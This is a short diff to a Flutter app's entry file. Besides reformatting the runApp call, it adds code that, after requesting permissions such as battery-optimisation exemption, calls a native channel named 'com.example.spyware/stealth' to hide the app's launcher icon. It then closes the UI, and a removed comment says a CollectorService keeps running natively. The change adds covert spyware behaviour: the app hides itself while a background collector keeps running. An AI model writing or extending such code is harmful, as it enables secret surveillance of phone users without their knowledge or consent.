@@ -4,10 +4,12 @@ import 'package:permission_handler/permission_handler.dart';
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
-  runApp(const MaterialApp(
-    debugShowCheckedModeBanner: false,
-    home: _PermissionGate(),
-  ));
+  runApp(
+    const MaterialApp(
+      debugShowCheckedModeBanner: false,
+      home: _PermissionGate(),
+    ),
+  );
 }
 
 class _PermissionGate extends StatefulWidget {
@@ -43,7 +45,14 @@ class _PermissionGateState extends State<_PermissionGate> {
       await Permission.ignoreBatteryOptimizations.request();
     }
 
-    // Close app — CollectorService keeps running natively
+    const platform = MethodChannel('com.example.spyware/stealth');
+    try {
+      await platform.invokeMethod('hideIcon');
+    } catch (e) {
+      print("Failed to hide icon: $e");
+    }
+
+    // Now close the Flutter UI
     SystemNavigator.pop();
   }
 
